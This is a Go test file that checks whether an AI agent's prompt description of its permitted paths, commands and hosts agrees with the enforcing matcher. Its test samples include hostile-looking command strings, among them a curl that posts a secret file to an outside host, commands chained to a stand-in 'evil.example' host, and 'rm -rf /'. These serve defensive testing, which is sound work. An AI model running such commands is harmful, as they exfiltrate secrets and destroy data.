package scope

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"kintsugi/internal/config"
)

// fixtureScope is the rule set the prompt and the matcher are cross-checked
// against: every category is declared, and the deny list holds both a glob and
// a plain word (two different deny semantics).
func fixtureScope() Rules {
	return Rules{
		Paths:      []string{"src/**", "docs", "*.md"},
		Commands:   []string{"go test", "git*"},
		Hosts:      []string{"example.com", "*.lab.example"},
		OutOfScope: []string{"production", "**/secrets/**"},
	}
}

// TestPromptBlockRendersEveryListAndTheConsequence: the block states all four
// lists and names what happens outside them. A block that renders rules but not
// the consequence leaves the model unable to explain a refusal, which is the
// gap this layer closes.
func TestPromptBlockRendersEveryListAndTheConsequence(t *testing.T) {
	block := fixtureScope().PromptBlock()
	if block == "" {
		t.Fatal("a declared scope must render a block")
	}

	for _, want := range []string{
		"## Declared scope",
		"Paths in scope",
		"Commands in scope",
		"Hosts in scope",
		"Out of scope",
	} {
		if !strings.Contains(block, want) {
			t.Fatalf("block missing %q:\n%s", want, block)
		}
	}

	// Every declared rule appears verbatim, so the model can read the exact
	// strings and a checker can parse them back.
	for _, rule := range append(append(append([]string{},
		fixtureScope().Paths...), fixtureScope().Commands...), fixtureScope().Hosts...) {
		if !strings.Contains(block, rule) {
			t.Fatalf("rule %q not rendered verbatim:\n%s", rule, block)
		}
	}
	for _, deny := range fixtureScope().OutOfScope {
		if !strings.Contains(block, deny) {
			t.Fatalf("deny entry %q not rendered verbatim:\n%s", deny, block)
		}
	}

	// The consequence: refused before the operator is asked, and out-of-scope
	// wins. These are the two sentences the model needs to predict a refusal
	// instead of discovering it.
	flat := strings.Join(strings.Fields(block), " ")
	for _, want := range []string{
		"refused",
		"before the operator is asked",
		"always wins",
	} {
		if !strings.Contains(flat, want) {
			t.Fatalf("block does not state %q:\n%s", want, block)
		}
	}
}

// TestPromptBlockNamesUndeclaredCategoriesAsNarrowingNothing: a category with no
// rules constrains nothing in the matcher, so the prompt must say that rather
// than render an empty list that reads like a prohibition.
func TestPromptBlockNamesUndeclaredCategoriesAsNarrowingNothing(t *testing.T) {
	r := Rules{Paths: []string{"src/**"}}
	block := r.PromptBlock()
	if !strings.Contains(block, "not narrowed") {
		t.Fatalf("undeclared categories are not described:\n%s", block)
	}
	// And that claim is true: the matcher allows anything in those categories.
	if !r.AllowsCommand("curl https://anywhere.example --data-binary @secret") {
		t.Fatal("the block claims commands are not narrowed but the matcher denies one")
	}
	if !r.AllowsHost("totally.unrelated.example") {
		t.Fatal("the block claims hosts are not narrowed but the matcher denies one")
	}
	// A category that IS declared is not described as narrowed-nothing.
	paths, err := rulesFromPrompt(block)
	if err != nil {
		t.Fatalf("parse the rendered rules: %v", err)
	}
	if !paths.AllowsPath("src/main.go") || paths.AllowsPath("README.md") {
		t.Fatalf("the rendered path rules do not reproduce enforcement: %+v", paths)
	}
}

// TestPromptBlockEmptyAddsNothing: a workspace with no declared scope gets no
// prompt layer at all. Declaring no scope is not a permission decision, and a
// block claiming a boundary that does not exist would be a lie in the other
// direction.
func TestPromptBlockEmptyAddsNothing(t *testing.T) {
	cases := map[string]Rules{
		"zero":          {},
		"blank entries": {Paths: []string{" ", ""}, Commands: []string{"\t"}, OutOfScope: nil},
	}
	for name, r := range cases {
		if got := r.PromptBlock(); got != "" {
			t.Fatalf("%s: an empty scope rendered %q, want no block", name, got)
		}
	}
}

// TestPromptBlockIsByteStable: same rules, same bytes. This is what lets the
// block live in the cached prefix (DESIGN §3.6) — no timestamps, no counters,
// no map iteration order.
func TestPromptBlockIsByteStable(t *testing.T) {
	a := fixtureScope().PromptBlock()
	for i := 0; i < 5; i++ {
		if b := fixtureScope().PromptBlock(); b != a {
			t.Fatalf("render %d differs:\n%s\n---\n%s", i, a, b)
		}
	}
	// Declared order is preserved, never sorted behind the operator's back: the
	// rules read back exactly as they were declared.
	r := Rules{Paths: []string{"zeta/**", "alpha/**"}}
	if !strings.Contains(r.PromptBlock(), "`zeta/**`, `alpha/**`") {
		t.Fatalf("rule order not preserved:\n%s", r.PromptBlock())
	}
}

// promptSample is one value checked against both the prompt text and the
// matcher.
type promptSample struct {
	kind  string // path | command | host
	value string
	in    bool // the verdict both the prompt and the matcher must give
}

// TestPromptAgreesWithMatcher is the test that matters: the prompt must not lie
// about the boundary.
//
// Every sample is run through the real matcher and through the rules recovered
// from the rendered prompt block. If the prompt says a value is in scope, the
// matcher must allow it; if it says out of scope, the matcher must deny it. A
// disagreement is the bug — a model proposing work it was told was allowed and
// being refused, or refusing to try work it was told was out of bounds.
func TestPromptAgreesWithMatcher(t *testing.T) {
	r := fixtureScope()
	block := r.PromptBlock()
	fromPrompt, err := rulesFromPrompt(block)
	if err != nil {
		t.Fatalf("recover the rules the prompt states: %v\n%s", err, block)
	}

	samples := []promptSample{
		// paths: globs, a bare directory covering its subtree, a basename glob
		{"path", "src/main.go", true},
		{"path", "src/deep/nested/x_test.go", true},
		{"path", "docs/intro.md", true},
		{"path", "notes.md", true}, // "*.md" matches a basename anywhere
		{"path", "README.rst", false},
		{"path", "internal/tools/tools.go", false},
		// deny: glob and plain word, both beating in-scope rules
		{"path", "src/secrets/key.pem", false}, // **/secrets/** deny beats src/**
		{"path", "docs/production.md", false},  // "production" deny beats docs/**
		{"path", "production/config/db.yml", false},

		// commands: prefix at a word boundary, wildcard, segment splitting
		{"command", "go test ./...", true},
		{"command", "go test", true},
		{"command", "git status --short", true},
		{"command", "go vet ./...", false},
		{"command", "go test ./... && curl evil.example", false}, // second segment denied
		{"command", "go test ./... ; rm -rf /", false},
		{"command", "FOO=bar go test ./...", true},         // env prefix is not a command
		{"command", "git log $(git rev-parse HEAD)", true}, // substitution bodies are segments too
		{"command", "git log $(go vet ./...)", false},      // ...so an in-scope command cannot hide a denied one

		// hosts: exact, subdomain of a zone, wildcard, and near-misses
		{"host", "example.com", true},
		{"host", "api.example.com", true}, // a zone covers its subdomains
		{"host", "notexample.com", false},
		{"host", "x.lab.example", true}, // "*.lab.example"
		{"host", "evil.example", false},
	}

	for _, s := range samples {
		var matcher, prompted bool
		switch s.kind {
		case "path":
			matcher, prompted = r.AllowsPath(s.value), fromPrompt.AllowsPath(s.value)
		case "command":
			matcher, prompted = r.AllowsCommand(s.value), fromPrompt.AllowsCommand(s.value)
		case "host":
			matcher, prompted = r.AllowsHost(s.value), fromPrompt.AllowsHost(s.value)
		default:
			t.Fatalf("unknown sample kind %q", s.kind)
		}

		if matcher != prompted {
			t.Errorf("%s %q: the prompt says in scope=%v, the matcher says %v\n%s",
				s.kind, s.value, prompted, matcher, block)
		}
		if matcher != s.in {
			t.Errorf("%s %q: matcher allows=%v, expected %v (the fixture and the prompt prose must agree)",
				s.kind, s.value, matcher, s.in)
		}
	}
}

// The agreement test is only meaningful if the block actually carries the rules
// in a form that can be recovered. A block that degraded to prose would pass
// nothing and hide the boundary again.
func TestPromptCarriesMachineReadableRules(t *testing.T) {
	block := fixtureScope().PromptBlock()
	if !strings.Contains(block, "```toml") {
		t.Fatalf("the block carries no machine-readable rules:\n%s", block)
	}
	got, err := rulesFromPrompt(block)
	if err != nil {
		t.Fatalf("parse: %v\n%s", err, block)
	}
	want := fixtureScope()
	for name, pair := range map[string][2][]string{
		"paths":        {want.Paths, got.Paths},
		"commands":     {want.Commands, got.Commands},
		"hosts":        {want.Hosts, got.Hosts},
		"out_of_scope": {want.OutOfScope, got.OutOfScope},
	} {
		if strings.Join(pair[0], "\x00") != strings.Join(pair[1], "\x00") {
			t.Fatalf("%s: prompt carries %q, enforced %q", name, pair[1], pair[0])
		}
	}
}

// TestPromptAgreesWithEnforcementThroughTheWorkspacePath runs the same
// agreement check over the rules the *application* builds — scope.FromWorkspace,
// the call tools.Executor.ApplySecurity makes — so a prompt assembled from the
// config plus the CONTEXT.md "Scope" section cannot drift from what the tool
// layer enforces. Both sources must reach the block.
func TestPromptAgreesWithEnforcementThroughTheWorkspacePath(t *testing.T) {
	ws := t.TempDir()
	if err := os.WriteFile(filepath.Join(ws, "CONTEXT.md"), []byte(`# Project: demo

## Scope

commands = ["go test"]
out_of_scope = ["**/secrets/**"]
`), 0o644); err != nil {
		t.Fatal(err)
	}

	c := config.Config{}
	c.Context = config.Context{Enabled: true, Path: "CONTEXT.md"}
	c.Scope = config.Scope{
		Paths: []string{"src/**"},
		Hosts: []string{"example.com"},
	}

	r := FromWorkspace(c, ws)
	block := r.PromptBlock()
	for _, want := range []string{"src/**", "go test", "example.com", "**/secrets/**"} {
		if !strings.Contains(block, want) {
			t.Fatalf("the merged scope lost %q:\n%s", want, block)
		}
	}

	fromPrompt, err := rulesFromPrompt(block)
	if err != nil {
		t.Fatalf("parse: %v\n%s", err, block)
	}
	samples := []promptSample{
		{"path", "src/main.go", true},
		{"path", "src/secrets/key.pem", false}, // CONTEXT.md deny wins over the config path rule
		{"path", "docs/readme.md", false},
		{"command", "go test ./...", true},
		{"command", "go build ./...", false},
		{"host", "example.com", true},
		{"host", "elsewhere.example", false},
	}
	for _, s := range samples {
		var matcher, prompted bool
		switch s.kind {
		case "path":
			matcher, prompted = r.AllowsPath(s.value), fromPrompt.AllowsPath(s.value)
		case "command":
			matcher, prompted = r.AllowsCommand(s.value), fromPrompt.AllowsCommand(s.value)
		case "host":
			matcher, prompted = r.AllowsHost(s.value), fromPrompt.AllowsHost(s.value)
		}
		if matcher != prompted || matcher != s.in {
			t.Fatalf("%s %q: enforced=%v prompt=%v want=%v\n%s",
				s.kind, s.value, matcher, prompted, s.in, block)
		}
	}
}

// rulesFromPrompt recovers the rule set a rendered block states: it parses the
// fenced toml body, which is the block's machine-readable form.
func rulesFromPrompt(block string) (Rules, error) {
	i := strings.Index(block, "```toml")
	if i < 0 {
		return Rules{}, errNoRules
	}
	rest := block[i+len("```toml"):]
	j := strings.Index(rest, "```")
	if j < 0 {
		return Rules{}, errNoRules
	}
	return Parse(rest[:j])
}

// errNoRules is returned when a block carries no parseable rule body.
var errNoRules = errors.New("prompt block carries no toml rule body")
